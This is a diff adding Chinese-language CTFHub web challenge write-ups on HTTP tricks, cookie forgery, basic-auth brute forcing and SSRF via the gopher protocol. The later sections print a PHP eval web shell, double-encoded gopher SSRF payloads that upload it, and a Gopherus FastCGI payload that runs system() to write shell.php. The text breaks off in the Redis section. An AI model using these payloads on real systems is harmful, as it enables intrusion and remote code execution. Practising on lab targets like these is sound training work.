@@ -1,6 +1,239 @@
 # Web
 
-## Web前置技能
+## HTTP协议
+
+### 请求方式
+
+> HTTP 请求方法，HTTP/1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。
+
+进入靶机后看到信息如下：
+
+> HTTP Method is GET
+>
+> Use CTF**B Method, I will give you flag.
+>
+> Hint: If you got 「HTTP Method Not Allowed」 Error, you should request index.php.
+
+直接用`curl`命令即可，`-X`参数指定HTTP请求的方法为CTFHUB，-v参数是启用详细模式，本题可省略。
+
+```
+┌──(t0ur1st㉿kali)-[~]
+└─$ curl -v -X CTFHUB http://challenge-96b75f3f07efdaed.sandbox.ctfhub.com:10800/index.php
+* Host challenge-96b75f3f07efdaed.sandbox.ctfhub.com:10800 was resolved.
+* IPv6: (none)
+* IPv4: 47.98.117.93
+*   Trying 47.98.117.93:10800...
+* Connected to challenge-96b75f3f07efdaed.sandbox.ctfhub.com (47.98.117.93) port 10800
+* using HTTP/1.x
+> CTFHUB /index.php HTTP/1.1
+> Host: challenge-96b75f3f07efdaed.sandbox.ctfhub.com:10800
+> User-Agent: curl/8.15.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: openresty/1.21.4.2
+< Date: Thu, 08 Jan 2026 12:33:34 GMT
+< Content-Type: text/html; charset=UTF-8
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< X-Powered-By: PHP/5.6.40
+< Access-Control-Allow-Origin: *
+< Access-Control-Allow-Headers: X-Requested-With
+< Access-Control-Allow-Methods: *
+< 
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8"/>
+    <title>CTFHub HTTP Method</title>
+</head>
+<body>
+
+good job! ctfhub{556a00d7be5d8caf8773e4ef}
+
+</body>
+</html>
+* Connection #0 to host challenge-96b75f3f07efdaed.sandbox.ctfhub.com left intact
+```
+
+提交`ctfhub{556a00d7be5d8caf8773e4ef}`即可。
+
+------
+
+### 302跳转
+
+> HTTP临时重定向
+
+关键源码如下：
+
+```html
+<h1>No Flag here!</h1>
+<a href="index.php">Give me Flag</a>
+```
+
+用`Burp Suite`抓包，点击链接访问`index.php`，右键`Send to Repeater`。
+
+```
+GET /index.php HTTP/1.1
+Host: challenge-d9cf5f93fb9d1890.sandbox.ctfhub.com:10800
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://challenge-d9cf5f93fb9d1890.sandbox.ctfhub.com:10800/index.html
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+```
+
+在`Repeater`中点击`Send`可以在`Response`中看到`flag`。
+
+```
+HTTP/1.1 302 Moved Temporarily
+Server: openresty/1.21.4.2
+Date: Thu, 08 Jan 2026 12:45:38 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40
+Location: /index.html
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Headers: X-Requested-With
+Access-Control-Allow-Methods: *
+Content-Length: 33
+
+ctfhub{fbb1a1cc576a92515e8dd8e9}
+```
+
+提交`ctfhub{fbb1a1cc576a92515e8dd8e9}`即可。
+
+------
+
+### Cookie
+
+> Cookie欺骗、认证、伪造
+
+进入靶机后看到信息：
+
+> hello guest. only admin can get flag.
+
+用`Burp Suite`抓包，可以看到`Cookie: admin=0`，将其修改为`admin=1`再放行即可。
+
+```
+GET / HTTP/1.1
+Host: challenge-1fd496e78b469c94.sandbox.ctfhub.com:10800
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: admin=0
+Connection: keep-alive
+```
+
+或者可以用`HackBar`添加`HEADER`，Name是`Cookie`，Value是`admin=1`，访问靶机也能拿到`flag`。
+
+提交`ctfhub{10c2c42641db9d17a3d75a66}`即可。
+
+------
+
+### 基础认证
+
+> 在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。详情请查看https://zh.wikipedia.org/wiki/HTTP%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81
+
+下载题目附件，解压缩后得到文件`10_million_password_list_top_100.txt`。fine，密码表。
+
+进入靶机后看到的网页如下：
+
+```html
+<h1>CTFHub 基础认证</h1>
+<div>
+    Here is your flag: <a href="/flag.html">click</a>
+</div>
+```
+
+点击`/flag.html`会弹出登录窗口，需要输入账号和密码进行登录。
+
+用`Burp Suite`抓包，我们先尝试输入账号`admin`，密码`1`，抓包的信息如下：
+
+```
+GET /flag.html HTTP/1.1
+Host: challenge-34c1f78d7a59115c.sandbox.ctfhub.com:10800
+Cache-Control: max-age=0
+Authorization: Basic YWRtaW46MQ==
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://challenge-34c1f78d7a59115c.sandbox.ctfhub.com:10800/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+```
+
+可以看到`Authorization`中的值包含`base64`编码`YWRtaW46MQ==`。
+
+用`python`编写代码进行`base64`解码后，发现其值为`admin:1`，也就是说账号和密码通过`:`连接起来再进行`base64`编码的值就是`Authorization`传递的一部分。
+
+```python
+>>> from base64 import b64decode
+>>> b64decode('YWRtaW46MQ==')
+b'admin:1'
+```
+
+回到`Burp Suite`，右键`Send to Intruder`，选中`YWRtaW46MQ==`后点击Add。
+
+在`Payload configuration`中点击`Load`，选择`10_million_password_list_top_100.txt`文件。
+
+在`Payload processing`中点击`Add`，选择`Add prefix`，填写前缀为`admin:`后确认。
+
+继续在`Payload processing`中点击`Add`添加规则，选择`Encode`中的`Base64-encode`后确认。
+
+接着在`Payload encoding`中取消勾选`URL-encode these characters`。
+
+在上述准备工作完成后，点击`Start attack`发起密码爆破攻击。
+
+查看结果时，我们看到Payload为`YWRtaW46YWNjZXNz`时，Status Code为200，很明显这次登录成功啦，其`base64`解码为`admin:access`。点击查看详情，在`Response`中可以看到以下信息。
+
+```
+HTTP/1.1 200 OK
+Server: openresty/1.21.4.2
+Date: Thu, 08 Jan 2026 13:14:05 GMT
+Content-Type: text/html; charset=utf-8
+Connection: keep-alive
+Last-Modified: Thu, 08 Jan 2026 12:56:53 GMT
+ETag: W/"695fa995-21"
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Headers: X-Requested-With
+Access-Control-Allow-Methods: *
+Content-Length: 33
+
+ctfhub{0e37de3ba19b1c3f4e465bfc}
+```
+
+提交`ctfhub{0e37de3ba19b1c3f4e465bfc}`即可。
+
+------
+
+### 响应包源代码
+
+> HTTP响应包源代码查看
+
+进入靶机后是一个简易版的贪吃蛇小游戏，右键查看网页源码，在注释中发现关键字符串。
+
+```html
+<body>
+    <canvas id="canvas" width="1000" height="700"></canvas>
+    <div>
+        <input id="switch" type="button" value="開始" onclick="clickSwitch()"></input><br/>
+        <input id="content" type="text" value="0"></input>
+    </div>
+</body>
+<!-- ctfhub{8a27b92e58a2121b04dc4814} -->
+```
+
+直接用`curl`也很容易就看到`flag`。提交`ctfhub{8a27b92e58a2121b04dc4814}`即可。
+
+------
 
 ## SQL注入
 
@@ -3085,3 +3318,604 @@ ctfhub{f25596e0f74ea29fb8b66f1b}
 
 ------
 
+### POST请求
+
+> 这次是发一个HTTP POST请求。对了，ssrf是用php的curl实现的，并且会跟踪302跳转。加油吧骚年。
+
+先构造`GET`请求`/?url=127.0.0.1/flag.php`，右键查看源码可以看到有个`key`
+
+```html
+<form action="/flag.php" method="post">
+<input type="text" name="key">
+<!-- Debug: key=8679c8e8ff37c9b40223423abaca119e-->
+</form>
+```
+
+这道题需要用到gopher协议。gopher协议支持发出GET、POST请求：可以先拦截GET请求包和POST请求包，再构造成符合gopher协议的请求。gopher协议是SSRF利用中最强大的协议（俗称万能协议）。其格式为`gopher://IP:port/_{TCP/IP数据流}`。
+
+由于`curl`支持`gopher协议`，所以这里是利用`curl`进行进行post请求，完成内网攻击。
+
+在gopher协议中发送HTTP的数据，需要以下三步：
+
+1、构造HTTP数据包
+2、URL编码、替换回车换行为`%0D%0A`
+3、发送gopher协议
+
+用`Burp Suite`抓包后保留关键信息：
+
+```
+POST /flag.php HTTP/1.1
+Host: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36
+key=8679c8e8ff37c9b40223423abaca119e
+```
+
+用python对以上信息进行`URL`编码。
+
+```python
+from urllib.parse import quote
+
+s = """POST /flag.php HTTP/1.1
+Host: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36
+key=8679c8e8ff37c9b40223423abaca119e"""
+
+encode_s = quote(s)
+print(encode_s)
+```
+
+把第一次编码中所有的%0A都替换成%0D%0A，并且末尾加上%0D%0A，然后进行二次编码。
+
+需要两次URL编码是因为在浏览器的地址栏进行get传参时，浏览器会自动进行一次`UrlDecode()`的解码。但是这里`curl`就需要`url`编码的东西，所以需要编两次。
+
+```
+POST%20/flag.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2036%0D%0Akey%3D8679c8e8ff37c9b40223423abaca119e
+```
+
+第二次编码的结果为：
+
+```
+POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250Akey%253D8679c8e8ff37c9b40223423abaca119e%250D%250A
+```
+
+我们再加上`gopher://127.0.0.1:80/_`，用`HackBar`发送`POST`请求。
+
+http://challenge-5a7003beb7bd8424.sandbox.ctfhub.com:10800/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250d%250AHost:127.0.0.1%250d%250AContent-Type:application/x-www-form-urlencoded%250d%250AContent-Length:36%250d%250A%250d%250Akey=8679c8e8ff37c9b40223423abaca119e%250d%250a
+
+靶机显示的信息如下：
+
+```
+HTTP/1.1 200 OK Date: Thu, 08 Jan 2026 06:20:29 GMT Server: Apache/2.4.25 (Debian) X-Powered-By: PHP/5.6.40 Content-Length: 32 Content-Type: text/html; charset=UTF-8 ctfhub{556239a9d8c62561709ffc84}
+```
+
+提交`flag`即可。
+
+------
+
+### 上传文件
+
+> 这次需要上传一个文件到flag.php了，祝你好运。
+
+访问靶机的`/?url=127.0.0.1/flag.php`，很明显少了个提交按钮，右键查看网页源码如下：
+
+```html
+Upload Webshell
+
+<form action="/flag.php" method="post" enctype="multipart/form-data">
+    <input type="file" name="file">
+</form>
+```
+
+在HTML中如果button在form标签中则默认是提交按钮，不用改变修改type属性。直接`F12`加个按钮。
+
+```html
+<form action="/flag.php" method="post" enctype="multipart/form-data">
+    <input type="file" name="file">
+    <button>提交</button>
+</form>
+```
+
+编写`PHP`一句话木马
+
+```php
+<?php @eval($_POST['t0ur1st']); ?>
+```
+
+上传文件后出现：
+
+> Just View From 127.0.0.1
+
+用`Burp Suite`抓包上传文件时的`POST`数据。
+
+```
+POST /flag.php HTTP/1.1
+Host: challenge-7f65b529cb061b36.sandbox.ctfhub.com:10800
+Content-Length: 227
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Origin: http://challenge-7f65b529cb061b36.sandbox.ctfhub.com:10800
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCwDRYcG3y5cgtLpG
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://challenge-7f65b529cb061b36.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+
+------WebKitFormBoundaryCwDRYcG3y5cgtLpG
+Content-Disposition: form-data; name="file"; filename="1.php"
+Content-Type: application/octet-stream
+
+<?php @eval($_POST['t0ur1st']); ?>
+------WebKitFormBoundaryCwDRYcG3y5cgtLpG--
+```
+
+编写`Python`代码进行`URL`编码：
+
+```python
+from urllib.parse import quote
+
+s = """POST /flag.php HTTP/1.1
+Host: challenge-7f65b529cb061b36.sandbox.ctfhub.com:10800
+Content-Length: 227
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+Origin: http://challenge-7f65b529cb061b36.sandbox.ctfhub.com:10800
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCwDRYcG3y5cgtLpG
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://challenge-7f65b529cb061b36.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+
+------WebKitFormBoundaryCwDRYcG3y5cgtLpG
+Content-Disposition: form-data; name="file"; filename="1.php"
+Content-Type: application/octet-stream
+
+<?php @eval($_POST['t0ur1st']); ?>
+------WebKitFormBoundaryCwDRYcG3y5cgtLpG--
+"""
+
+encode_s = quote(s)
+print(encode_s)
+```
+
+运行代码后得到：
+
+```
+POST%20/flag.php%20HTTP/1.1%0AHost%3A%20challenge-7f65b529cb061b36.sandbox.ctfhub.com%3A10800%0AContent-Length%3A%20227%0ACache-Control%3A%20max-age%3D0%0AUpgrade-Insecure-Requests%3A%201%0AUser-Agent%3A%20Mozilla/5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit/537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome/143.0.0.0%20Safari/537.36%0AOrigin%3A%20http%3A//challenge-7f65b529cb061b36.sandbox.ctfhub.com%3A10800%0AContent-Type%3A%20multipart/form-data%3B%20boundary%3D----WebKitFormBoundaryCwDRYcG3y5cgtLpG%0AAccept%3A%20text/html%2Capplication/xhtml%2Bxml%2Capplication/xml%3Bq%3D0.9%2Cimage/avif%2Cimage/webp%2Cimage/apng%2C%2A/%2A%3Bq%3D0.8%2Capplication/signed-exchange%3Bv%3Db3%3Bq%3D0.7%0AReferer%3A%20http%3A//challenge-7f65b529cb061b36.sandbox.ctfhub.com%3A10800/%3Furl%3D127.0.0.1/flag.php%0AAccept-Encoding%3A%20gzip%2C%20deflate%2C%20br%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.9%2Cen-US%3Bq%3D0.8%2Cen%3Bq%3D0.7%0AConnection%3A%20keep-alive%0A%0A------WebKitFormBoundaryCwDRYcG3y5cgtLpG%0AContent-Disposition%3A%20form-data%3B%20name%3D%22file%22%3B%20filename%3D%221.php%22%0AContent-Type%3A%20application/octet-stream%0A%0A%3C%3Fphp%20%40eval%28%24_POST%5B%27t0ur1st%27%5D%29%3B%20%3F%3E%0A------WebKitFormBoundaryCwDRYcG3y5cgtLpG--%0A
+```
+
+将所有的%0A修改为%0D%0A，再进行二次URL编码得到：
+
+```
+POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520challenge-7f65b529cb061b36.sandbox.ctfhub.com%253A10800%250D%250AContent-Length%253A%2520227%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/143.0.0.0%2520Safari/537.36%250D%250AOrigin%253A%2520http%253A//challenge-7f65b529cb061b36.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D----WebKitFormBoundaryCwDRYcG3y5cgtLpG%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.7%250D%250AReferer%253A%2520http%253A//challenge-7f65b529cb061b36.sandbox.ctfhub.com%253A10800/%253Furl%253D127.0.0.1/flag.php%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%252C%2520br%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%252Cen-US%253Bq%253D0.8%252Cen%253Bq%253D0.7%250D%250AConnection%253A%2520keep-alive%250D%250A%250D%250A------WebKitFormBoundaryCwDRYcG3y5cgtLpG%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%25221.php%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253C%253Fphp%2520%2540eval%2528%2524_POST%255B%2527t0ur1st%2527%255D%2529%253B%2520%253F%253E%250D%250A------WebKitFormBoundaryCwDRYcG3y5cgtLpG--%250D%250A
+```
+
+我们再加上`gopher://127.0.0.1:80/_`，由于gopher协议支持发出GET和POST请求，所以无需再构造`POST`请求，直接发送`GET`请求也可。
+
+http://challenge-7f65b529cb061b36.sandbox.ctfhub.com:10800/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520challenge-7f65b529cb061b36.sandbox.ctfhub.com%253A10800%250D%250AContent-Length%253A%2520227%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/143.0.0.0%2520Safari/537.36%250D%250AOrigin%253A%2520http%253A//challenge-7f65b529cb061b36.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D----WebKitFormBoundaryCwDRYcG3y5cgtLpG%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.7%250D%250AReferer%253A%2520http%253A//challenge-7f65b529cb061b36.sandbox.ctfhub.com%253A10800/%253Furl%253D127.0.0.1/flag.php%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%252C%2520br%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%252Cen-US%253Bq%253D0.8%252Cen%253Bq%253D0.7%250D%250AConnection%253A%2520keep-alive%250D%250A%250D%250A------WebKitFormBoundaryCwDRYcG3y5cgtLpG%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%25221.php%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253C%253Fphp%2520%2540eval%2528%2524_POST%255B%2527t0ur1st%2527%255D%2529%253B%2520%253F%253E%250D%250A------WebKitFormBoundaryCwDRYcG3y5cgtLpG--%250D%250A
+
+靶机显示的信息如下：
+
+```
+HTTP/1.1 200 OK Date: Thu, 08 Jan 2026 10:58:05 GMT Server: Apache/2.4.25 (Debian) X-Powered-By: PHP/5.6.40 Content-Length: 32 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html; charset=UTF-8 ctfhub{e631c5e7332eee694ba91881}
+```
+
+提交`flag`即可。
+
+------
+
+### FastCGI协议
+
+> 这次，我们需要攻击一下fastcgi协议咯，也许附件的文章会对你有点帮助。
+
+FastCGI是一种用于数据传输的通信协议，与HTTP协议相似，它提供了一个进行数据交换的通道。
+
+- HTTP协议是浏览器和服务器中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。
+- 类比HTTP协议来说，FastCGI协议则是服务器中间件和某个语言后端进行数据交换的协议。FastCGI协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照FastCGI的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。
+
+这里引入一个GitHub项目https://github.com/tarunkant/Gopherus，在Kali中安装。
+
+```bash
+git clone https://github.com/tarunkant/Gopherus.git
+```
+
+编写`PHP`一句话木马：
+
+```php
+<?php @eval($_POST['t0ur1st']); ?>
+```
+
+用`python`对其进行`base64`编码。
+
+```python
+>>> from base64 import b64encode
+>>> b64encode(b"<?php @eval($_POST['t0ur1st']); ?>")
+b'PD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg=='
+```
+
+这里需要先学习一个命令行，可以对以上`base64`字符串进行`base64`解码，并将结果写入`shell.php`。
+
+```
+echo PD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg== | base64 -d > shell.php
+```
+
+在`Kali`系统中输入以下命令启动`Gopherus`，以准备好利用SSRF漏洞的`payload`。
+
+```
+┌──(t0ur1st㉿kali)-[~/Tools]
+└─$ python2 Gopherus/gopherus.py --exploit fastcgi
+
+  ________              .__
+ /  _____/  ____ ______ |  |__   ___________ __ __  ______
+/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
+\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
+ \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
+        \/       |__|        \/     \/                 \/
+
+                author: $_SpyD3r_$
+
+Give one file name which should be surely present in the server (prefer .php file)
+if you don't know press ENTER we have default one:  index.php                                                                                               
+Terminal command to run:  echo PD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg== | base64 -d > shell.php
+
+Your gopher link is ready to do SSRF:                                             
+
+gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F7%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH129%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%81%04%00%3C%3Fphp%20system%28%27echo%20PD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg%3D%3D%20%7C%20base64%20-d%20%3E%20shell.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
+
+-----------Made-by-SpyD3r-----------
+```
+
+编写`Python`代码进行`URL`编码：
+
+```python
+from urllib.parse import quote
+
+s = """gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F7%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH129%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%81%04%00%3C%3Fphp%20system%28%27echo%20PD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg%3D%3D%20%7C%20base64%20-d%20%3E%20shell.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00"""
+
+encode_s = quote(s)
+print(encode_s)
+```
+
+URL编码结果如下：
+
+```
+gopher%3A//127.0.0.1%3A9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%25F7%2507%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2503CONTENT_LENGTH129%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%2509SCRIPT_FILENAMEindex.php%250D%2501DOCUMENT_ROOT/%2500%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%2581%2504%2500%253C%253Fphp%2520system%2528%2527echo%2520PD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg%253D%253D%2520%257C%2520base64%2520-d%2520%253E%2520shell.php%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
+```
+
+直接访问http://challenge-b305a1ef0d47257f.sandbox.ctfhub.com:10800/?url=gopher%3A//127.0.0.1%3A9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%25F7%2507%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2503CONTENT_LENGTH129%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%2509SCRIPT_FILENAMEindex.php%250D%2501DOCUMENT_ROOT/%2500%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%2581%2504%2500%253C%253Fphp%2520system%2528%2527echo%2520PD9waHAgQGV2YWwoJF9QT1NUWyd0MHVyMXN0J10pOyA/Pg%253D%253D%2520%257C%2520base64%2520-d%2520%253E%2520shell.php%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500，可以得到以下信息：
+
+> X-Powered-By: PHP/5.6.40 Content-type: text/html; charset=UTF-8 -----Made-by-SpyD3r----- UTF
+
+这说明啥？还记不记得我们的一句话木马？它已经上传成功啦。
+
+不信就访问`/?url=file:///var/www/html/shell.php`查看文件内容，右键查看源码可以看到信息：
+
+```php
+<?php @eval($_POST['t0ur1st']); ?>
+```
+
+用`AntSword`连接靶机http://challenge-b305a1ef0d47257f.sandbox.ctfhub.com:10800/shell.php。
+
+可以在靶机服务器根目录发现文件`flag_febda5bc5ff5614e0e366369a0251431`，打开后看到`flag`。
+
+提交`ctfhub{6388fe22d26f0e4fdccb7f62}`即可。
+
+------
+
+### Redis协议
+
+> 这次来攻击redis协议吧。redis://127.0.0.1:6379。资料？没有资料！自己找！
+
+这道题还是需要用到上一道题的`Gopherus`工具。
+
+与上一道题不同的是，这一道题我们需要用到的命令行是：
+
+```php
+<?php @eval($_POST['t0ur1st']) ?>
+```
+
+在`Kali`系统中输入以下命令启动`Gopherus`，以准备好利用SSRF漏洞的`payload`。
+
+```
+┌──(t0ur1st㉿kali)-[~/Tools]
+└─$ python2 Gopherus/gopherus.py --exploit redis  
+
+  ________              .__
+ /  _____/  ____ ______ |  |__   ___________ __ __  ______
+/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
+\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
+ \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
+        \/       |__|        \/     \/                 \/
+
+                author: $_SpyD3r_$
+
+Ready To get SHELL
+What do you want?? (ReverseShell/PHPShell): PHPShell
+
+Give web root location of server (default is /var/www/html):
+Give PHP Payload (We have default PHP Shell): <?php @eval($_POST['t0ur1st']) ?>
+
+Your gopher link is Ready to get PHP Shell:                                       
+
